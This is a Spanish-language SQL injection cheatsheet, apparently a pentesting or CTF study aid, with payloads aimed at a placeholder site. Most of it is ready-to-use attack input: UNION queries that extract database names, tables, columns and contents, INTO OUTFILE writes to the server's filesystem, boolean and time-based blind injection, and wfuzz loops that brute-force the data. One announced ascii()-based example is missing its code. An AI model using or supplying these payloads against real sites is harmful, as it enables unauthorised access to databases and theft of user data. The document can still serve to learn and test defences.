#### Hoja de Referencia (Cheatsheet) de Inyección SQL
Esta hoja de referencia NO debe considerarse una referencia definitiva, sino una guía sobre la cual construir. Algunos de los ejemplos a continuación requerirán modificaciones, 
tales como codificación URL (url encode), comentarios, etc. Antes de continuar, aquí hay un par de funciones SQL útiles que conviene conocer.

```php
limit <desplazamiento de fila>,<número de filas>             # mostrar filas según el desplazamiento (offset) y cantidad  

count(*)                                                     # mostrar el número de filas  

rand()                                                       # generar un número aleatorio entre 0 y 1 

floor(rand()*<número>)                                       # imprimir la parte entera de un número decimal aleatorio 

select(select database());                                   # consulta doble (anidada) usando database() como ejemplo 

group by <nombre de columna>                                 # agrupar/resumir filas según el nombre de la columna  

concat(<cadena1>, <cadena2>, ..)                             # concatenar cadenas como nombres de tablas o columnas  

length(<cadena>)                                             # calcular el número de caracteres de una cadena dada 

substr(<cadena>,<desplazamiento>,<longitud de caracteres>)   # imprimir caracteres de una cadena indicando desplazamiento y longitud 

ascii(<carácter>)                                            # representación decimal del carácter 

sleep(<número de segundos>)                                  # pausar la ejecución durante <número de segundos>

if(<condición>,<acción verdadera>,<acción falsa>)            # sentencia condicional if 

like "<cadena>%"                                             # comprueba si la cadena proporcionada está presente

outfile "<ruta al archivo>"                                  # volcar el resultado de la sentencia select en un archivo

load_file("<ruta al archivo>")                               # volcar el contenido de un archivo
```
Ahora viene la parte divertida: aquí tienes una combinación de ejemplos de inyección de comandos SQL basados en errores, basados en UNION y a ciegas (blind).

Determinar el número de columnas de la consulta en el back-end con inyección SQL de cadena basada en errores:
```php
http://meh.com/index.php?id=1 order by <number>
```

Determinar el número de columnas de la consulta en el back-end observando el `tamaño de respuesta http` con `wfuzz` en una inyección SQL de enteros basada en errores:
```php
wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
```

Identificar las columnas imprimibles en la página web mediante UNION proporcionando un valor falso a la consulta del back-end con inyección SQL de enteros basada en errores. Esta 
inyección depende del número de columnas identificadas por la cláusula `order by`:
```php
http://meh.com/index.php?id=-1 union select <number of columns separated by comma>
```

Volcar el contenido de la tabla en el sistema de archivos:
```php
http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

Imprimir la versión de SQL del back-end con inyección SQL de enteros basada en errores, asumiendo que el contenido de la columna 3 se muestra en la página web:
```php
http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
```

Imprimir el usuario que ejecuta la consulta para acceder al servidor de base de datos back-end con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
```

Imprimir el nombre de la base de datos con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
```

Imprimir el directorio de la base de datos con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
```

Imprimir los nombres de las tablas con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
```

Imprimir los nombres de las columnas con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
```

Imprimir el contenido de una columna con inyección SQL de enteros basada en errores:
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
```

Usar la sentencia `and` como sustituto de comentarios regulares tales como `--+`, `#` y `/* */` con inyección SQL de cadena basada en errores:
```php
http://meh.com/index.php?id=1' <sqli here> and '1
```
Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos (boolean-based blind) usando `substr()`:
```php
http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
```

Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con una combinación de `substr()` y `wfuzz`, 
asumiendo que el nombre de la base de datos no incluye caracteres especiales:
```php
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' 
and (substr(database(),$i,1))='FUZZ' --+";done 
```
Determinar el nombre de la base de datos con inyección SQL a ciegas basada en booleanos observando el `tamaño de respuesta http` con `substr()`, `ascii()` y `wfuzz`. El 
siguiente rango corresponde a los caracteres ASCII estándar (32-127):

Confirmar inyección SQL a ciegas basada en tiempo (time-based blind) usando la función `sleep()`:
```php
http://meh.com/index.php?id=1' and sleep(10) --+
```

Determinar la versión de la base de datos con inyección SQL a ciegas basada en tiempo usando `sleep()`, `like""` y el condicional `if`, asumiendo que la base de datos back-end 
ejecuta la versión 5:
```php
http://meh.com/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
```

¡Notas finales!
- Si llegaste hasta aquí, ya sabes que la mayoría de los ejemplos de inyección de comandos SQL están basados en `MySQL` y no planeo hacer ninguno para `MSSQL` porque me da pereza.
- Usa tu proxy preferido para evadir las restricciones de JavaScript del lado del cliente.
- La cláusula `order by` solo funciona con comentarios regulares como `--+`.
- Actualiza el rango ASCII para incluir caracteres especiales si vas tras la tabla de usuarios (`users`).
- `MySQL` no tiene permisos para sobrescribir un archivo existente; asegúrate de usar un nombre de archivo nuevo cada vez que uses `outfile`.
- Asegúrate de que el parámetro vulnerable tenga un valor falso cuando trabajes con inyección SQL basada en UNION.
- Cabe señalar que todos los ejemplos en esta hoja de referencia fueron peticiones HTTP `GET`, y no debería ser tan difícil replicarlos con peticiones HTTP `POST` una vez que comprendas los conceptos básicos.
- Necesitas introducir un valor verdadero en el parámetro vulnerable para que `and sleep()` funcione; de lo contrario, usa `or sleep()`. Aquí tienes un ejemplo para mayor claridad:
```php
http://meh.com/index.php?id=<true value>' and sleep(1) #
http://meh.com/index.php?id=<false value>' or sleep(1) #
```
